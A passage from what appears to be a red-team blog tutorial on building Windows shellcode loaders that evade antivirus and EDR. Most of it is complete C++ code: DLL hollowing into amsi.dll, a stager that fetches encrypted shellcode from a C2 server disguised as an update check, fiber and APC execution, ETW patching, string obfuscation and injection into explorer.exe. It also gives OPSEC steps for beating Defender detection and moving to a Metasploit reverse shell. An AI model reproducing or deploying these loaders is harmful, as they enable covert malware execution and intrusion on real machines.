    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    HMODULE remoteDllBase = (HMODULE)(ULONG_PTR)exitCode;
    CloseHandle(hThread);

    printf("[+] Loaded amsi.dll in target at: 0x%p\n", remoteDllBase);

    // Step 2: Find the .text section of the loaded DLL
    // Read the PE headers from the remote process
    IMAGE_DOS_HEADER dosHeader;
    ReadProcessMemory(hProcess, remoteDllBase, &dosHeader,
                      sizeof(dosHeader), NULL);

    IMAGE_NT_HEADERS ntHeaders;
    ReadProcessMemory(hProcess,
                      (BYTE*)remoteDllBase + dosHeader.e_lfanew,
                      &ntHeaders, sizeof(ntHeaders), NULL);

    IMAGE_SECTION_HEADER sections[16];
    ReadProcessMemory(hProcess,
        (BYTE*)remoteDllBase + dosHeader.e_lfanew + sizeof(ntHeaders),
        sections,
        ntHeaders.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER),
        NULL);

    PVOID textAddr = NULL;
    SIZE_T textSize = 0;

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            textAddr = (BYTE*)remoteDllBase + sections[i].VirtualAddress;
            textSize = sections[i].Misc.VirtualSize;
            break;
        }
    }

    printf("[+] .text section at: 0x%p (size: %zu)\n", textAddr, textSize);

    // Step 3: Write shellcode over the .text section
    // (Decrypt your shellcode first, then write it)
    unsigned char shellcode[] = { 0x00 };  // Your decrypted shellcode
    SIZE_T scSize = sizeof(shellcode);

    DWORD oldProtect;
    VirtualProtectEx(hProcess, textAddr, scSize,
                     PAGE_READWRITE, &oldProtect);
    WriteProcessMemory(hProcess, textAddr, shellcode, scSize, NULL);
    VirtualProtectEx(hProcess, textAddr, scSize,
                     PAGE_EXECUTE_READ, &oldProtect);

    // Step 4: Execute — shellcode runs from amsi.dll's address space
    HANDLE hExecThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)textAddr, NULL, 0, NULL);

    printf("[+] Shellcode executing from DLL address space!\n");

    WaitForSingleObject(hExecThread, INFINITE);
    CloseHandle(hExecThread);
    CloseHandle(hProcess);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique24_hollow.exe technique24_dll_hollowing.cpp -lws2_32 -static
```

---

### Technique 25: Payload Staging (Download at Runtime)

Instead of embedding shellcode in the binary (even encrypted), download it from a remote server at runtime. This means the binary itself contains zero shellcode — it's a clean downloader.

**Advantages:**
- The binary on disk has no shellcode signature at all
- You can update the payload without recompiling the loader
- The download URL can be a legitimate-looking domain or CDN
- The payload can be encrypted in transit (HTTPS + additional encryption)

**Full Code — `technique25_staging.cpp`:**

```cpp
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

// Download encrypted shellcode from a remote server
BOOL DownloadPayload(const wchar_t* host, WORD port, const wchar_t* path,
                     unsigned char** buffer, SIZE_T* bufferSize) {

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",  // User agent
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) return FALSE;

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        (port == 443) ? WINHTTP_FLAG_SECURE : 0  // HTTPS if port 443
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Send request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                             0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Read response body
    SIZE_T totalSize = 0;
    SIZE_T allocSize = 4096;
    *buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, allocSize);

    DWORD bytesRead = 0;
    while (WinHttpReadData(hRequest,
                            *buffer + totalSize,
                            (DWORD)(allocSize - totalSize),
                            &bytesRead)) {
        if (bytesRead == 0) break;
        totalSize += bytesRead;

        // Grow buffer if needed
        if (totalSize >= allocSize - 1024) {
            allocSize *= 2;
            *buffer = (unsigned char*)HeapReAlloc(
                GetProcessHeap(), 0, *buffer, allocSize);
        }
    }

    *bufferSize = totalSize;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return TRUE;
}

// XOR decrypt
void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    printf("[*] Downloading encrypted payload...\n");

    unsigned char* payload = NULL;
    SIZE_T payloadSize = 0;

    // Download from your C2 server
    // The server serves AES or XOR-encrypted shellcode
    if (!DownloadPayload(
            L"192.168.1.100",       // Your server
            443,                     // Port (HTTPS)
            L"/update/check",       // Path (looks like legitimate update check)
            &payload, &payloadSize)) {
        printf("[-] Download failed\n");
        return 1;
    }

    printf("[+] Downloaded %zu bytes\n", payloadSize);

    // Decrypt the payload
    unsigned char key[] = { 0x4a, 0x7b, 0x2e, 0x91, 0xf3, 0xc8, 0x55, 0xd2,
                            0x0a, 0x3f, 0x8c, 0xe1, 0x67, 0xb4, 0x19, 0xa6 };
    xor_decrypt(payload, payloadSize, key, sizeof(key));
    printf("[+] Payload decrypted\n");

    // Allocate, copy, protect, execute
    LPVOID mem = VirtualAlloc(NULL, payloadSize,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(mem, payload, payloadSize);

    // Zero the download buffer
    SecureZeroMemory(payload, payloadSize);
    HeapFree(GetProcessHeap(), 0, payload);

    DWORD oldProtect;
    VirtualProtect(mem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Executing staged payload...\n");
    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)mem, 0);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique25_staging.exe technique25_staging.cpp -lwinhttp -lws2_32 -static
```

---

### Technique 26: Fiber-Based Execution

Windows fibers are lightweight threading primitives that are manually scheduled by user code (not the kernel). Because they don't create kernel-managed threads, they generate fewer telemetry events and are less monitored by EDRs.

**Full Code — `technique26_fibers.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

unsigned char encrypted_shellcode[] = { 0x00 };
unsigned char xor_key[] = { 0x41 };
SIZE_T shellcode_size = sizeof(encrypted_shellcode);

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    SIZE_T scSize = shellcode_size;

    // Step 1: Allocate and prepare shellcode
    LPVOID mem = VirtualAlloc(NULL, scSize,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;

    RtlMoveMemory(mem, encrypted_shellcode, scSize);
    xor_decrypt((unsigned char*)mem, scSize, xor_key, sizeof(xor_key));

    DWORD oldProtect;
    VirtualProtect(mem, scSize, PAGE_EXECUTE_READ, &oldProtect);

    // Step 2: Convert the current thread to a fiber
    // This is required before creating/switching to other fibers
    LPVOID mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) {
        printf("[-] ConvertThreadToFiber failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Main thread converted to fiber\n");

    // Step 3: Create a new fiber with shellcode as the entry point
    LPVOID shellcodeFiber = CreateFiber(
        0,                              // Default stack size
        (LPFIBER_START_ROUTINE)mem,     // Fiber entry = shellcode
        NULL                            // No parameter
    );

    if (!shellcodeFiber) {
        printf("[-] CreateFiber failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Shellcode fiber created\n");

    // Step 4: Switch to the shellcode fiber
    // This transfers execution to our shellcode
    // No new thread is created — this is a context switch within the same thread
    printf("[+] Switching to shellcode fiber...\n");
    SwitchToFiber(shellcodeFiber);

    // Execution returns here when/if the shellcode fiber calls
    // SwitchToFiber(mainFiber)
    printf("[+] Returned from shellcode fiber\n");

    // Cleanup
    DeleteFiber(shellcodeFiber);
    VirtualFree(mem, 0, MEM_RELEASE);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique26_fibers.exe technique26_fibers.cpp -lws2_32 -static
```

> Fibers are cooperative — they don't preempt each other. The shellcode fiber will run until it either completes or explicitly yields back to the main fiber. This is useful for shellcode that runs and exits, less so for long-running implants.
{: .prompt-tip }

---

### Technique 27: Syscall Proxy via NtTestAlert / NtQueueApcThread

This technique queues an APC to the **current thread** (not a remote thread) and then triggers it with `NtTestAlert`. This avoids `CreateThread`, `CreateRemoteThread`, and even callback-based execution.

**Why it's stealthy:**
- No thread creation
- No callback abuse
- `NtTestAlert` is a rarely-monitored function
- APC execution is a legitimate OS mechanism

**Full Code — `technique27_ntTestAlert.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// NtTestAlert — triggers pending APCs on the current thread
typedef NTSTATUS (NTAPI *NtTestAlert_t)(void);

// NtQueueApcThread — queue an APC to a specific thread
typedef NTSTATUS (NTAPI *NtQueueApcThread_t)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcRoutineContext,
    PVOID ApcStatusBlock,
    PVOID ApcReserved
);

unsigned char encrypted_shellcode[] = { 0x00 };
unsigned char xor_key[] = { 0x41 };
SIZE_T shellcode_size = sizeof(encrypted_shellcode);

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    // Resolve Nt functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtTestAlert_t NtTestAlert = (NtTestAlert_t)
        GetProcAddress(hNtdll, "NtTestAlert");
    NtQueueApcThread_t NtQueueApcThread = (NtQueueApcThread_t)
        GetProcAddress(hNtdll, "NtQueueApcThread");

    if (!NtTestAlert || !NtQueueApcThread) {
        printf("[-] Failed to resolve Nt functions\n");
        return 1;
    }

    // Prepare shellcode
    LPVOID mem = VirtualAlloc(NULL, shellcode_size,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(mem, encrypted_shellcode, shellcode_size);
    xor_decrypt((unsigned char*)mem, shellcode_size,
                xor_key, sizeof(xor_key));

    DWORD oldProtect;
    VirtualProtect(mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Shellcode prepared at: 0x%p\n", mem);

    // Queue APC to current thread — shellcode as the APC routine
    NTSTATUS status = NtQueueApcThread(
        GetCurrentThread(),     // Current thread
        mem,                    // APC routine = shellcode address
        NULL,                   // Context
        NULL,                   // Status block
        NULL                    // Reserved
    );

    if (status != 0) {
        printf("[-] NtQueueApcThread failed: 0x%lX\n", status);
        return 1;
    }
    printf("[+] APC queued to current thread\n");

    // Trigger the APC — NtTestAlert processes all pending APCs
    printf("[+] Calling NtTestAlert to trigger APC execution...\n");
    NtTestAlert();

    // If shellcode returns, execution continues here
    printf("[+] Execution complete\n");

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique27_nttest.exe technique27_ntTestAlert.cpp -lws2_32 -static
```

---

## Part 8: Compilation and OPSEC

### Compiler Optimization Flags

How you compile your loader matters as much as the code itself. Default compilation settings leave extensive metadata, debug symbols, and recognizable compiler artifacts.

**Recommended MinGW Compilation Flags:**

```bash
x86_64-w64-mingw32-g++ \
    -O2                     # Optimization level 2 (good balance of size/speed)
    -s                      # Strip all symbol information
    -fno-exceptions         # Disable C++ exceptions (reduces code size)
    -fno-rtti               # Disable Run-Time Type Information
    -ffunction-sections     # Each function in its own section
    -fdata-sections         # Each data item in its own section
    -Wl,--gc-sections       # Linker: garbage collect unused sections
    -static                 # Static linking (no DLL dependencies)
    -mwindows               # Windows subsystem (no console window)
    -o loader.exe \
    loader.cpp \
    -lws2_32 -lbcrypt       # Link required libraries
```

**Flags Explained:**

| Flag | Purpose | Evasion Impact |
|---|---|---|
| `-O2` | Optimizes code, changes instruction patterns | Makes decompilation harder |
| `-s` | Strips debug symbols | Removes function names, file paths |
| `-fno-exceptions` | Removes exception handling code | Smaller binary, fewer signatures |
| `-fno-rtti` | Removes type info | Less metadata for analysis |
| `-ffunction-sections` + `-Wl,--gc-sections` | Removes unused code | Smaller, cleaner binary |
| `-static` | No external DLL dependencies | Avoids DLL load events |
| `-mwindows` | Windows subsystem | No console window popup |

**Custom Entry Point (Avoid CRT Signatures):**

The default C runtime (CRT) initialization code has a recognizable pattern. You can bypass it with a custom entry point:

```cpp
// Define WinMain or a custom entry point
// Compile with: -nostartfiles -e CustomEntry

void CustomEntry() {
    // Your loader code here
    // No CRT initialization (no printf, no malloc — use Win32 APIs directly)

    // Exit cleanly
    ExitProcess(0);
}
```

```bash
x86_64-w64-mingw32-g++ -nostartfiles -e CustomEntry -O2 -s -static -mwindows \
    -o loader.exe loader.cpp -lkernel32 -luser32
```

**Post-Compilation Stripping:**

```bash
# Additional stripping
x86_64-w64-mingw32-strip --strip-all loader.exe

# Check the result
file loader.exe
strings loader.exe | wc -l    # Should be minimal
```

**MSVC Compilation:**

```powershell
cl.exe /O2 /GS- /GL /MT /W0 /Fe:loader.exe loader.cpp
# /O2  = Optimize for speed
# /GS- = Disable buffer security check (removes __security_cookie)
# /GL  = Whole program optimization
# /MT  = Static CRT linking
# /W0  = Disable all warnings
```

---

### Testing Your Loader

**Phase 1: Functional Testing (No AV)**

1. Disable Windows Defender in a VM
2. Generate a `calc.exe` shellcode:
   ```bash
   msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o test_payload.bin
   ```
3. Encrypt with your Python script
4. Compile the loader
5. Run — calc.exe should pop up

**Phase 2: Static Detection Testing**

1. Re-enable Defender
2. Copy the compiled binary to the VM
3. Does Defender flag it on disk? (Right-click → Scan with Defender)
4. If flagged, use **DefenderCheck** to find which bytes trigger detection:
   ```bash
   # DefenderCheck splits the binary and identifies the flagged bytes
   DefenderCheck.exe loader.exe
   ```
5. Modify the flagged section (change encryption keys, add junk bytes, reorder code)

**Phase 3: Dynamic/Runtime Testing**

1. Run the binary with Defender enabled (no exclusions)
2. Use the `calc.exe` payload first (avoids network-based detection)
3. Monitor with Process Monitor (ProcMon) to see what your loader does
4. Check if Defender quarantines the binary during or after execution

**Phase 4: Network Testing**

1. Switch to a real reverse shell payload
2. Set up a Metasploit listener
3. Test with Defender enabled
4. Monitor network-level detection

> Test incrementally: static → behavioral → network. If static detection fails, there's no point testing behavioral. Fix each layer before moving to the next.
{: .prompt-tip }

---

### OPSEC Considerations

Operational security (OPSEC) determines whether your tooling survives in the real world. Technical evasion is necessary but not sufficient — you also need to avoid patterns that lead to detection through correlation and analysis.

**Rule 1: Unique Keys Per Engagement**

{% raw %}
```python
# WRONG: Reusing the same key across engagements
xor_key = b"\x41\x42\x43\x44"

# RIGHT: Generate unique keys for every build
import os
xor_key = os.urandom(16)  # New random key every time
```
{% endraw %}

**Rule 2: Randomize Identifiers**

```cpp
// WRONG: Predictable variable names
LPVOID shellcodeMemory = VirtualAlloc(...);
HANDLE shellcodeThread = CreateThread(...);

// RIGHT: Random, innocent-looking names
LPVOID pConfigBuffer = VirtualAlloc(...);
HANDLE hWorkerThread = CreateThread(...);
```

**Rule 3: Add Junk Code and Delays**

```cpp
// Add legitimate-looking operations between suspicious calls
DWORD dummy = GetTickCount();
Sleep(rand() % 1000 + 500);  // Random delay (500-1500ms)

// Read some registry keys (legitimate activity)
HKEY hKey;
RegOpenKeyExA(HKEY_LOCAL_MACHINE,
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
    0, KEY_READ, &hKey);
RegCloseKey(hKey);

// Now do the suspicious operation
LPVOID mem = VirtualAlloc(...);
```

**Rule 4: Vary Allocation Sizes**

```cpp
// WRONG: Allocating exactly the shellcode size
VirtualAlloc(NULL, 510, ...);  // Suspiciously precise

// RIGHT: Allocate more than needed (page-aligned, with random padding)
SIZE_T allocSize = (shellcode_size + 4096) & ~0xFFF;  // Page-aligned
allocSize += (rand() % 10) * 4096;  // Random extra pages
VirtualAlloc(NULL, allocSize, ...);
```

**Rule 5: Choose Injection Targets Wisely**

| Target | Risk Level | Notes |
|---|---|---|
| `explorer.exe` | Medium | Always running, but crashes = user impact |
| `svchost.exe` | Low | Many instances, common network activity |
| `RuntimeBroker.exe` | Low | Common Windows process |
| `taskhostw.exe` | Low | Generic task host |
| `notepad.exe` | High | Only present if user opened it |
| `calc.exe` | Very High | Nobody runs Calculator long-term |

**Rule 6: Don't Reuse Loaders**

Every loader submitted to VirusTotal or detected by an EDR gets its hash cataloged. If you reuse a loader binary across engagements, detection of one compromises all.

**Compilation checklist for every build:**
- [ ] New encryption keys (XOR, AES)
- [ ] New variable/function names
- [ ] Different junk code patterns
- [ ] Different injection target
- [ ] Different sleep intervals
- [ ] Different compilation flags or order
- [ ] New binary hash

---

## Part 9: Putting It All Together — Final Loader

This section combines the most effective techniques from throughout this blog into a single conceptual loader. This represents what a professional red team loader might look like in 2026.

**Architecture:**

```
┌─────────────────────────────────────────────────┐
│                  Final Loader                    │
├─────────────────────────────────────────────────┤
│  1. ETW Patch (Technique 17)                    │
│     → Disable event logging first               │
├─────────────────────────────────────────────────┤
│  2. String Obfuscation (Technique 8)            │
│     → All API names encrypted at compile time   │
├─────────────────────────────────────────────────┤
│  3. Dynamic API Resolution (Technique 10+11)    │
│     → Resolve APIs via hashing, no IAT entries  │
├─────────────────────────────────────────────────┤
│  4. AES-256 Decryption (Technique 6)            │
│     → Decrypt shellcode at runtime              │
├─────────────────────────────────────────────────┤
│  5. Direct/Indirect Syscalls (Technique 12/13)  │
│     → Bypass EDR hooks for Nt* functions        │
├─────────────────────────────────────────────────┤
│  6. Remote Injection (Technique 19)             │
│     → Inject into legitimate process via syscall│
├─────────────────────────────────────────────────┤
│  7. W^X Memory (RW → copy → RX)                │
│     → Never use RWX memory                      │
└─────────────────────────────────────────────────┘
```

**Full Conceptual Code — `final_loader.cpp`:**

```cpp
/*
 * Final Loader — Combines multiple evasion techniques
 * FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
 *
 * Techniques used:
 *   - ETW patching
 *   - String obfuscation (stack strings)
 *   - Dynamic API resolution via GetProcAddress
 *   - AES-256 encrypted shellcode (via BCrypt)
 *   - Nt* API calls for memory operations
 *   - Remote process injection
 *   - W^X memory permissions (RW -> RX)
 */

#include <windows.h>
#include <bcrypt.h>
#include <tlhelp32.h>

#pragma comment(lib, "bcrypt.lib")

// ============================================================
// SECTION 1: AES-256 Encrypted Shellcode (from aes_encrypt.py)
// ============================================================

unsigned char aes_key[] = {
    0x60, 0x72, 0xa3, 0x14, 0xb5, 0xc6, 0xd7, 0xe8,
    0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60,
    0x71, 0x82, 0x93, 0xa4, 0xb5, 0xc6, 0xd7, 0xe8,
    0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60
};

unsigned char aes_iv[] = {
    0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x07, 0x18,
    0x29, 0x3a, 0x4b, 0x5c, 0x6d, 0x7e, 0x8f, 0x90
};

unsigned char encrypted_shellcode[] = {
    // Paste AES-encrypted shellcode from Python script
    0x00  // placeholder
};

SIZE_T original_shellcode_size = 460;  // Update from Python output

// ============================================================
// SECTION 2: Stack Strings (no strings in .rdata)
// ============================================================

void BuildString_ntdll(char* out) {
    out[0]='n'; out[1]='t'; out[2]='d'; out[3]='l';
    out[4]='l'; out[5]='.'; out[6]='d'; out[7]='l';
    out[8]='l'; out[9]='\0';
}

void BuildString_kernel32(char* out) {
    out[0]='k'; out[1]='e'; out[2]='r'; out[3]='n';
    out[4]='e'; out[5]='l'; out[6]='3'; out[7]='2';
    out[8]='.'; out[9]='d'; out[10]='l'; out[11]='l';
    out[12]='\0';
}

void BuildString_EtwEventWrite(char* out) {
    out[0]='E'; out[1]='t'; out[2]='w'; out[3]='E';
    out[4]='v'; out[5]='e'; out[6]='n'; out[7]='t';
    out[8]='W'; out[9]='r'; out[10]='i'; out[11]='t';
    out[12]='e'; out[13]='\0';
}

// ============================================================
// SECTION 3: ETW Patching
// ============================================================

void PatchETW() {
    char ntdll[10]; BuildString_ntdll(ntdll);
    char etwFunc[14]; BuildString_EtwEventWrite(etwFunc);

    HMODULE hNtdll = GetModuleHandleA(ntdll);
    if (!hNtdll) return;

    FARPROC pETW = GetProcAddress(hNtdll, etwFunc);
    if (!pETW) return;

    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax,rax; ret
    DWORD oldProtect;
    VirtualProtect(pETW, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    for (int i = 0; i < sizeof(patch); i++)
        ((unsigned char*)pETW)[i] = patch[i];
    VirtualProtect(pETW, sizeof(patch), oldProtect, &oldProtect);
}

// ============================================================
// SECTION 4: AES Decryption (BCrypt API)
// ============================================================

BOOL AESDecrypt(unsigned char* ct, SIZE_T ct_len,
                unsigned char* key, SIZE_T key_len,
                unsigned char* iv, SIZE_T iv_len,
                unsigned char** pt, SIZE_T* pt_len) {

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbResult = 0, cbKeyObj = 0;
    PBYTE pbKeyObj = NULL;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return FALSE; }

    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObj, sizeof(DWORD), &cbResult, 0);
    pbKeyObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj,
        key, (ULONG)key_len, 0);
    if (!BCRYPT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pbKeyObj);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Copy IV (BCryptDecrypt modifies it)
    unsigned char* ivCopy = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, iv_len);
    for (SIZE_T i = 0; i < iv_len; i++) ivCopy[i] = iv[i];

    // Get output size
    DWORD cbPt = 0;
    BCryptDecrypt(hKey, ct, (ULONG)ct_len, NULL, ivCopy, (ULONG)iv_len,
        NULL, 0, &cbPt, BCRYPT_BLOCK_PADDING);

    *pt = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, cbPt);

    // Reset IV copy
    for (SIZE_T i = 0; i < iv_len; i++) ivCopy[i] = iv[i];

    // Decrypt
    status = BCryptDecrypt(hKey, ct, (ULONG)ct_len, NULL,
        ivCopy, (ULONG)iv_len, *pt, cbPt, &cbPt, BCRYPT_BLOCK_PADDING);

    *pt_len = cbPt;

    HeapFree(GetProcessHeap(), 0, ivCopy);
    HeapFree(GetProcessHeap(), 0, pbKeyObj);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return BCRYPT_SUCCESS(status);
}

// ============================================================
// SECTION 5: Process Discovery
// ============================================================

DWORD FindTargetProcess() {
    // Build target name on stack
    char target[16];
    target[0]='e'; target[1]='x'; target[2]='p'; target[3]='l';
    target[4]='o'; target[5]='r'; target[6]='e'; target[7]='r';
    target[8]='.'; target[9]='e'; target[10]='x'; target[11]='e';
    target[12]='\0';

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, target) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

// ============================================================
// SECTION 6: Dynamic API Resolution
// ============================================================

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID,
    PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtOpenProcess)(
    PHANDLE, ACCESS_MASK, PVOID, PVOID);

typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } MY_CID;
typedef struct {
    ULONG Length; HANDLE RootDirectory; PVOID ObjectName;
    ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQoS;
} MY_OA;

// ============================================================
// SECTION 7: Main Entry Point
// ============================================================

int main() {
    // ---- Phase 1: Pre-flight ----
    // Add anti-sandbox delay
    Sleep(3000 + (GetTickCount() % 2000));

    // Patch ETW (stop event logging)
    PatchETW();

    // ---- Phase 2: Resolve APIs ----
    char ntdll[10]; BuildString_ntdll(ntdll);
    HMODULE hNtdll = GetModuleHandleA(ntdll);
    if (!hNtdll) return 1;

    // Build function names on stack
    char sNtAlloc[26]; // NtAllocateVirtualMemory
    sNtAlloc[0]='N'; sNtAlloc[1]='t'; sNtAlloc[2]='A'; sNtAlloc[3]='l';
    sNtAlloc[4]='l'; sNtAlloc[5]='o'; sNtAlloc[6]='c'; sNtAlloc[7]='a';
    sNtAlloc[8]='t'; sNtAlloc[9]='e'; sNtAlloc[10]='V'; sNtAlloc[11]='i';
    sNtAlloc[12]='r'; sNtAlloc[13]='t'; sNtAlloc[14]='u'; sNtAlloc[15]='a';
    sNtAlloc[16]='l'; sNtAlloc[17]='M'; sNtAlloc[18]='e'; sNtAlloc[19]='m';
    sNtAlloc[20]='o'; sNtAlloc[21]='r'; sNtAlloc[22]='y'; sNtAlloc[23]='\0';

    char sNtWrite[23]; // NtWriteVirtualMemory
    sNtWrite[0]='N'; sNtWrite[1]='t'; sNtWrite[2]='W'; sNtWrite[3]='r';
    sNtWrite[4]='i'; sNtWrite[5]='t'; sNtWrite[6]='e'; sNtWrite[7]='V';
    sNtWrite[8]='i'; sNtWrite[9]='r'; sNtWrite[10]='t'; sNtWrite[11]='u';
    sNtWrite[12]='a'; sNtWrite[13]='l'; sNtWrite[14]='M'; sNtWrite[15]='e';
    sNtWrite[16]='m'; sNtWrite[17]='o'; sNtWrite[18]='r'; sNtWrite[19]='y';
    sNtWrite[20]='\0';

    char sNtProtect[25]; // NtProtectVirtualMemory
    sNtProtect[0]='N'; sNtProtect[1]='t'; sNtProtect[2]='P'; sNtProtect[3]='r';
    sNtProtect[4]='o'; sNtProtect[5]='t'; sNtProtect[6]='e'; sNtProtect[7]='c';
    sNtProtect[8]='t'; sNtProtect[9]='V'; sNtProtect[10]='i'; sNtProtect[11]='r';
    sNtProtect[12]='t'; sNtProtect[13]='u'; sNtProtect[14]='a'; sNtProtect[15]='l';
    sNtProtect[16]='M'; sNtProtect[17]='e'; sNtProtect[18]='m'; sNtProtect[19]='o';
    sNtProtect[20]='r'; sNtProtect[21]='y'; sNtProtect[22]='\0';

    char sNtThread[17]; // NtCreateThreadEx
    sNtThread[0]='N'; sNtThread[1]='t'; sNtThread[2]='C'; sNtThread[3]='r';
    sNtThread[4]='e'; sNtThread[5]='a'; sNtThread[6]='t'; sNtThread[7]='e';
    sNtThread[8]='T'; sNtThread[9]='h'; sNtThread[10]='r'; sNtThread[11]='e';
    sNtThread[12]='a'; sNtThread[13]='d'; sNtThread[14]='E'; sNtThread[15]='x';
    sNtThread[16]='\0';

    char sNtOpen[14]; // NtOpenProcess
    sNtOpen[0]='N'; sNtOpen[1]='t'; sNtOpen[2]='O'; sNtOpen[3]='p';
    sNtOpen[4]='e'; sNtOpen[5]='n'; sNtOpen[6]='P'; sNtOpen[7]='r';
    sNtOpen[8]='o'; sNtOpen[9]='c'; sNtOpen[10]='e'; sNtOpen[11]='s';
    sNtOpen[12]='s'; sNtOpen[13]='\0';

    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)
        GetProcAddress(hNtdll, sNtAlloc);
    pNtWriteVirtualMemory NtWrite = (pNtWriteVirtualMemory)
        GetProcAddress(hNtdll, sNtWrite);
    pNtProtectVirtualMemory NtProtect = (pNtProtectVirtualMemory)
        GetProcAddress(hNtdll, sNtProtect);
